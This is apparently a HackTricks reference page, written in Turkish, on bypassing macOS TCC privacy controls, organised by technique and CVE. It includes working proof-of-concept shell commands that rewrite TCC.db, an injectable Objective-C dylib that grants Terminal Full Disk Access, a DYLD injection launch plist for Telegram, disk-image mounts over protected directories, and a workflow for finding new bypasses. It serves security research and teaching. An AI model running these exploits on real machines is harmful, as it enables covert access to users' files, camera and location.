# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## İşlevselliğe göre

### Write Bypass

Bu bir bypass değildir; TCC'nin çalışma şekli böyledir: **Yazmaya karşı koruma sağlamaz**. Terminal'in **bir kullanıcının Desktop'ını okuma erişimi yoksa bile içine yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Yeni **file**'a, **creators app**'e bu dosyayı okuma erişimi vermek için **`com.apple.macl` extended attribute** eklenir.

### TCC ClickJacking

Kullanıcının fark etmeden **kabul etmesini** sağlamak için **TCC prompt'unun üzerine bir pencere yerleştirmek** mümkündür. Bir PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** üzerinde bulabilirsiniz.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker, **`Info.plist`** içinde herhangi bir ada (ör. Finder, Google Chrome...) sahip **apps oluşturabilir** ve bunların bazı TCC protected location'lara erişim istemesini sağlayabilir. Kullanıcı, bu erişimi isteyenin meşru application olduğunu düşünecektir.\
Ayrıca, meşru app'i Dock'tan **kaldırıp fake olanı Dock'a eklemek** mümkündür. Böylece kullanıcı, aynı icon'u kullanabilen fake app'e tıkladığında fake app meşru app'i çağırabilir, TCC permissions isteyebilir ve bir malware çalıştırabilir; bu da kullanıcının erişimi meşru app'in istediğine inanmasını sağlar.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Varsayılan olarak **SSH üzerinden erişim "Full Disk Access"** özelliğine sahipti. Bunu disable etmek için erişimin listede bulunması ancak disabled olması gerekir (listeden kaldırmak bu privileges'ı kaldırmaz):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: By default an access via SSH used to have "Full Disk Access" . In order to disable this you need to have it listed but disabled (removing it...](<../../../../../images/image (1077).png>)

Burada bazı **malwares'lerin bu protection'ı bypass edebildiğine** dair örnekler bulabilirsiniz:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[11]](#references)</sup>

> [!CAUTION]
> Artık SSH'yi enable edebilmek için **Full Disk Access** gerektiğini unutmayın.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** attribute, **belirli bir application'a dosyayı okuma permissions'ı vermek** için files'a atanır. Bu attribute, bir file'ı bir app'in üzerine **drag\&drop** ettiğinizde veya kullanıcı bir file'ı **default application ile açmak için** **double-click** yaptığında set edilir.

Bu nedenle bir user, tüm extensions'ları handle edecek **malicious app register edebilir** ve herhangi bir file'ı **open** etmek için Launch Services'ı çağırabilir (böylece malicious file'a bu file'ı okuma access'i verilir).

### iCloud

**`com.apple.private.icloud-account-access`** entitlement'ı sayesinde, **iCloud tokens sağlayacak** olan **`com.apple.iCloudHelper`** XPC service ile iletişim kurulabilir.

**iMovie** ve **Garageband** bu entitlement'a ve bunu mümkün kılan diğer entitlement'lara sahipti.

Bu entitlement'tan **icloud tokens elde etmeye** yönelik exploit hakkında daha fazla **information** için şu konuşmaya bakın: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[12]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission'ına sahip bir app, **diğer Apps'leri kontrol edebilir**. Bu, diğer Apps'lere verilmiş permissions'ların **abuse edilebileceği** anlamına gelir.

Apple Scripts hakkında daha fazla bilgi için:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Örneğin, bir App'in **`iTerm` üzerinde Automation permission'ı** varsa; bu örnekte **`Terminal` iTerm üzerinde access'e** sahiptir:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

FDA'ya sahip olmayan Terminal, iTerm'ı çağırabilir; iTerm FDA'ya sahip olduğundan Terminal onu actions gerçekleştirmek için kullanabilir:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder Üzerinden

Veya bir App'in Finder üzerinden erişimi varsa, şu tür bir script çalıştırabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App davranışına göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon**, TCC users database'e şu konumdan erişmek için **`HOME`** **env** değişkenini kullanıyordu: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)'a göre ve TCC daemon'ı mevcut kullanıcının domain'i içinde **`launchd`** aracılığıyla çalıştığından, kendisine aktarılan **tüm environment variable'ları kontrol etmek** mümkündür.\
Böylece bir **attacker**, **`launchctl`** içinde **`$HOME` environment** variable'ını **kontrolündeki** bir **directory**'yi gösterecek şekilde ayarlayabilir, **TCC** daemon'ını yeniden başlatabilir ve ardından son kullanıcıya hiçbir zaman prompt gösterilmeden kendisine **mevcut her TCC entitlement'ını** vermek için **TCC database'i doğrudan değiştirebilir**.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes, TCC tarafından korunan konumlara erişebiliyordu; ancak bir note oluşturulduğunda bu **korumasız bir konumda oluşturulur**. Bu nedenle Notes'tan korunan bir dosyayı bir note'a (yani korumasız bir konuma) kopyalamasını isteyebilir ve ardından dosyaya erişebilirdiniz:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` library'sine sahip `/usr/libexec/lsd` binary'si, **nullfs** mount oluşturmasına izin veren `com.apple.private.nullfs_allow` entitlement'ına ve her dosyaya erişmesini sağlayan **`kTCCServiceSystemPolicyAllFiles`** ile `com.apple.private.tcc.allow` entitlement'ına sahipti.

"Library" konumuna quarantine attribute eklemek, **`com.apple.security.translocation`** XPC service'ini çağırmak ve ardından Library'yi, Library içindeki tüm dokümanların **erişilebildiği** **`$TMPDIR/AppTranslocation/d/d/Library`** konumuna map etmek mümkündü.

### CVE-2024-44131 - FileProvider symlink race

Dosya işlemlerini **privileged helper**'a (burada **`fileproviderd`** / **`Files.app`**) devreden uygulamalar, öğeleri **kullanıcı adına** kopyalar veya taşır; bu nedenle copy, caller yerine helper'ın privileges'larıyla çalışır.

Jamf Threat Labs, işlemden önce gerçekleştirilen symlink validation'ın **race edilebildiğini** gösterdi: attacker, **son** path component'ına (kontrol edilen bileşene) symlink yerleştirmek yerine, copy başladıktan **sonra** path'in **intermediate** directory'sini değiştirir. Ardından privileged helper, attacker tarafından kontrol edilen link'i takip ederek TCC tarafından korunan konumları **hiç prompt göstermeden** okur/yazar.<sup>[[7]](#references)</sup>

Path'lerinde random UUID ile **korunmayan** directory'ler (örneğin `~/Library/Mobile Documents/com~apple~CloudDocs`) en kolay hedeflerdir; çünkü attacker race için gereken tam path'i tahmin edebilir.

> [!TIP]
> Aranması gereken generic pattern şudur: **bir path'i birden fazla kez çözen herhangi bir privileged process** (check-then-use veya source ve destination'ı ayrı ayrı çözen `rename()`/`copyfile()`) path'in ortasındaki bir directory değiştirilerek race edilebilir. Yalnızca `O_NOFOLLOW_ANY`, önceden açılmış bir directory FD üzerinde `openat()` veya `realpath()` + yeniden validation bu aralığı gerçekten kapatır.

Daha fazla bilgi için [**the Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[7]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3`, environment variable'lar tarafından yönlendirilen bir logging hook ekleyen `SQLITE_ENABLE_SQLLOG` ile build edilebilir ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[8]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **açılan her database için**, **database file'ın bir copy'si** ve SQL statement'larının bir log'u `path` içine yazılır (directory önceden mevcut olmalıdır).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bir DB her açıldığında/attach edildiğinde mevcut dosyayı yeniden kullanmak yerine **her seferinde yeni bir copy** oluşturur.
- **`SQLITE_SQLLOG_CONDITIONAL`** – yalnızca ana DB'nin yanında bir `<database>-sqllog` file'ı varsa connection'ı loglar.

Bu variable'ı **FDA** sahibi olan ve SQLite database'lerini açan bir process'e inject edebilirseniz, bu process korunan database'leri kontrol ettiğiniz bir directory'ye memnuniyetle **copy'ler**. Destination filename attacker-controlled data'dan türetildiği için destination'a yerleştirilen bir **symlink**, aynı primitive'i target process'in privileges'larıyla **arbitrary file write** işlemine dönüştürür.

### **SQLITE_AUTO_TRACE**

`SQLITE_AUTO_TRACE` environment variable'ı set edilirse, **`libsqlite3.dylib` library'si** tüm SQL query'lerini **loglamaya** başlar. Birçok application bu library'yi kullanıyordu; bu nedenle tüm SQLite query'lerini loglamak mümkündü.

Birkaç Apple application'ı TCC tarafından korunan bilgilere erişmek için bu library'yi kullanıyordu.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes arama

Önceki iki giriş aynı generic technique'in örnekleridir ve daha fazlasını aramak faydalıdır: **TCC-privileged app'lere yüklenen framework'ler genellikle process'in caller-controlled bir path'te file oluşturmasına neden olan debug/logging environment variable'larını açığa çıkarır**.

Bunları bulma workflow'u:

1. FDA veya başka bir değerli TCC permission'ı olan bir target seçin (`Music`, `TV`, `Terminal`, MDM agents...) ve link ettiği framework'leri listeleyin (`otool -L`, `vmmap`).
2. Bu framework'lerde `getenv` string'lerini grep'leyin: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Candidate variable'ları `launchctl setenv NAME /path/you/control` ile set edin, app'i launch edin ve filesystem üzerinde ne yaptığını `fs_usage -w -f filesys <pid>` veya `sudo fs_usage | grep <path>` ile izleyin.
4. Process sizin directory'nizde bir file **create veya rename ederse**, bir write primitive elde etmiş olursunuz: destination'ı bir symlink'e yönlendirin (veya yukarıdaki CVE-2024-44131'de olduğu gibi bir intermediate directory üzerinde race gerçekleştirin) ve file'ı `~/Library/Application Support/com.apple.TCC/TCC.db` üzerine redirect edin.

> [!TIP]
> Bunu sınırlayan iki şey vardır. Birincisi, **`DYLD_*` variable'ları hardened-runtime binary'leri için göz ardı edilir**; ancak app, [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement'ını ("app'in, app'in process'ine code inject etmek için kullanabileceğiniz dynamic linker environment variable'larından etkilenip etkilenemeyeceğini belirten bir Boolean value") taşıyorsa bu mümkün olabilir — ayrıca [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) bölümüne bakın. İkincisi, Apple rapor edildikçe individual framework debug variable'larını kaldırır; bu nedenle bir macOS release'inde çalışan bir variable çoğunlukla bir sonraki release'te yoktur. Bir variable set ettikten sonra app sessizce launch olmayı reddederse, bu variable'ı zaten filtrelenmiş olarak değerlendirin.

Linker variable'larıyla eşdeğer trick için [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) bölümüne bakın.

### Apple Remote Desktop

Root olarak bu service'i enable edebilirsiniz; böylece **ARD agent full disk access'e sahip olur** ve bir user tarafından yeni bir **TCC user database** kopyalaması için abuse edilebilir.

## **NFSHomeDirectory** ile

TCC, user'a özgü resource'lara erişimi kontrol etmek için user'ın HOME folder'ında **$HOME/Library/Application Support/com.apple.TCC/TCC.db** konumunda bir database kullanır.\
Bu nedenle user, `$HOME` env variable'ı **farklı bir folder'ı** gösterecek şekilde TCC'yi restart etmeyi başarırsa, **/Library/Application Support/com.apple.TCC/TCC.db** içinde yeni bir TCC database oluşturabilir ve TCC'yi herhangi bir app'e herhangi bir TCC permission'ı vermesi için kandırabilir.

> [!TIP]
> Apple'ın **`NFSHomeDirectory`** attribute'unda user profile içinde saklanan setting'i **`$HOME` değeri** olarak kullandığını unutmayın; bu nedenle bu değeri değiştirme permission'larına (**`kTCCServiceSystemPolicySysAdminFiles`**) sahip bir application'ı compromise ederseniz, bu option'ı bir TCC bypass ile **weaponize** edebilirsiniz.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, user'ın **HOME** folder'ını değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Target app için bir _csreq_ blob'u alın.
2. Gerekli access ve _csreq_ blob'u ile sahte bir _TCC.db_ file'ı plant edin.
3. User'ın Directory Services entry'sini [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile export edin.
4. User'ın home directory'sini değiştirmek için Directory Services entry'sini modify edin.
5. Modify edilmiş Directory Services entry'sini [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile import edin.
6. User'ın _tccd_'sini stop edin ve process'i reboot edin.

İkinci POC, `kTCCServiceSystemPolicySysAdminFiles` değerine sahip `com.apple.private.tcc.allow` entitlement'ı bulunan **`/usr/libexec/configd`**'yi kullandı.\
`configd`'yi **`-t`** option'ı ile çalıştırmak mümkündü; attacker, **yüklenmek üzere custom bir Bundle** belirtebiliyordu. Bu nedenle exploit, user'ın home directory'sini değiştirmek için kullanılan **`dsexport`** ve **`dsimport`** method'larının yerine bir **`configd` code injection** kullanır.

Daha fazla bilgi için [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) bölümüne bakın.<sup>[[13]](#references)</sup>

## process injection ile

Bir process içine code inject etmek ve TCC privilege'larını abuse etmek için farklı technique'ler vardır:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Bununla birlikte, TCC bypass için bulunan en yaygın process injection, **plugins (load library)** aracılığıyladır.\
Plugins, genellikle library veya plist biçimindeki ve **main application tarafından load edilerek** onun context'i altında execute edilen ek code'dur. Bu nedenle main application'ın TCC restricted file'lara erişimi varsa (verilmiş permission'lar veya entitlement'lar aracılığıyla), **custom code da aynı erişime sahip olur**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application'ı **`kTCCServiceSystemPolicySysAdminFiles`** entitlement'ına sahipti, **`.daplug`** extension'lı plugins'leri load ediyordu ve hardened runtime'a **sahip değildi**.

Bu CVE'yi weaponize etmek için, TCC'yi bypass etmek üzere user'ların TCC database'ini **ele geçirebilmek** amacıyla (önceki entitlement abuse edilerek) **`NFSHomeDirectory` değiştirilir**.

Daha fazla bilgi için [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) bölümüne bakın.<sup>[[14]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary'si `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` entitlement'larına sahipti. İlki **code injection'a izin verirken**, ikincisi ona **TCC'yi manage etme** access'i veriyordu.

Bu binary, `/Library/Audio/Plug-Ins/HAL` folder'ından **third party plug-in'ler** load edebiliyordu. Bu nedenle şu POC ile **bir plugin load etmek ve TCC permission'larını abuse etmek** mümkündü:<sup>[[15]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.<sup>[[15]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O üzerinden kamera akışını açan sistem uygulamaları (**`kTCCServiceCamera`** içeren uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` konumunda bulunan bu plugin'leri (SIP kısıtlamasına tabi değil) **process içinde yükler**.

Oraya yalnızca yaygın **constructor** içeren bir library yerleştirmek **code injection** için yeterlidir.

Birkaç Apple uygulaması buna karşı savunmasızdı.

### Firefox

Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` entitlement'ları bulunuyordu:<sup>[[16]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Bu konunun nasıl kolayca exploit edileceği hakkında daha fazla bilgi için [**orijinal raporu kontrol edin**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[16]](#references)</sup>

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` binary'sinde **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** entitlement'ları bulunuyordu; bu da process içine code inject edilmesine ve TCC privilege'larının kullanılmasına olanak sağlıyordu.

### CVE-2023-26818 - Telegram

Telegram'da **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** entitlement'ları bulunuyordu; bu nedenle Telegram'ın permission'larına erişmek, örneğin kamerayla kayıt yapmak, için abuse edilmesi mümkündü. [**Payload'ı writeup'ta bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[17]](#references)</sup>

Bir library yüklemek için env variable'ın nasıl kullanıldığına dikkat edin: bu library'yi inject etmek için **özel bir plist** oluşturuldu ve bunu launch etmek için **`launchctl`** kullanıldı:<sup>[[17]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open invocations ile

Sandboxed durumdayken bile **`open`** çağırmak mümkündür.

### Terminal Scripts

Tech kişiler tarafından kullanılan bilgisayarlarda Terminal'e **Full Disk Access (FDA)** vermek oldukça yaygındır. Bununla birlikte **`.terminal`** script'lerini çağırmak mümkündür.

**`.terminal`** script'leri, çalıştırılacak komutun **`CommandString`** anahtarında bulunduğu aşağıdaki gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama /tmp gibi bir konuma bir terminal script'i yazabilir ve bunu şu şekilde bir komutla başlatabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Herhangi bir kullanıcı** (yetkisiz olanlar bile) bir Time Machine snapshot'ı oluşturup mount edebilir ve bu snapshot'taki **TÜM dosyalara erişebilir**.\
Gerekli **tek ayrıcalık**, kullanılan uygulamanın (örneğin `Terminal`) bir yönetici tarafından verilmesi gereken **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC file üzerine mount etme

TCC DB file korumalı olsa bile, dizinin üzerine yeni bir TCC.db file **mount etmek** mümkündü:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
[**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) içindeki **tam exploit** bölümüne göz atın.

### CVE-2024-40855

[original writeup](https://www.kandji.io/blog/macos-audit-story-part2) bölümünde açıklandığı üzere bu CVE, `diskarbitrationd` bileşenini abuse ediyordu.<sup>[[18]](#references)</sup>

Public `DiskArbitration` framework'ündeki `DADiskMountWithArgumentsCommon` işlevi security kontrollerini gerçekleştiriyordu. Ancak doğrudan `diskarbitrationd` çağrılarak bu kontrolleri bypass etmek ve bu nedenle path içinde `../` öğeleri ile symlink'ler kullanmak mümkündü.

Bu durum, bir saldırganın herhangi bir konuma arbitrary mount işlemleri gerçekleştirmesine olanak sağladı. Buna, `diskarbitrationd` bileşeninin `com.apple.private.security.storage-exempt.heritable` entitlement'ı sayesinde TCC database'inin üzerine mount etmek de dahildi.

### asr

**`/usr/sbin/asr`** aracı, tüm diski kopyalamaya ve TCC protections'ı bypass ederek başka bir konuma mount etmeye olanak sağlıyordu.

### CVE-2022-22655 - Location Services

Location Services, diğer servisler gibi bir TCC database'inde **saklanmaz**. Bunun yerine, kendi allow-list'ini **`/var/db/locationd/clients.plist`** içinde tutan `locationd` tarafından yönetilir:<sup>[[5]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Her giriş, istemci (bundle ID veya executable path) tarafından anahtarlanır ve `Authorized`, `BundleId`, `Executable` ve `Registered` gibi alanları içerir.

`clients.plist` dosyasının kendisi Sandbox/TCC tarafından korunur ve root olarak bile düzenlenemez — ancak **`/var/db/locationd/` dizini mounting işlemine karşı korunmuyordu**. Bu nedenle root olarak çalışan bir attacker, kendi `clients.plist` dosyasını içeren bir disk image oluşturabilir (binary dosyasını `Authorized` olarak işaretleyerek), bunu dizinin üzerine mount edebilir ve forged allow-list'in etkinleşmesi için `locationd` servisini yeniden başlatabilirdi.<sup>[[5]](#references)</sup>

> [!TIP]
> Bu, yukarıdaki `hdiutil`/`mount` TCC bypass'leriyle aynı pattern'dir: *file* korunur, dosyanın bulunduğu *directory* korunmaz; bu nedenle file yerine tüm directory'yi değiştirirsiniz.

## Startup apps üzerinden


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep ile

Birçok durumda dosyalar; e-posta adresleri, telefon numaraları, mesajlar... gibi sensitive bilgileri protected olmayan konumlarda depolar (Apple açısından bunlar vulnerability olarak kabul edilir).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanmanın başka bir yolu:<sup>[[19]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Bypassing the macOS Transparency, Consent, and Control (TCC) Framework](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Bypassing macOS TCC User Privacy Protections By Accident and Design](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [20+ Ways to Bypass Your macOS Privacy Mechanisms](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [4] [Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [5] [CVE-2022-22655 - TCC Location Services bypass (original report)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [6] [Where in the World is Carmen Sandiego: Abusing Location Services on macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [7] [Jamf Threat Labs - CVE-2024-44131: TCC bypass steals data from iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [8] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env variables)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [9] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
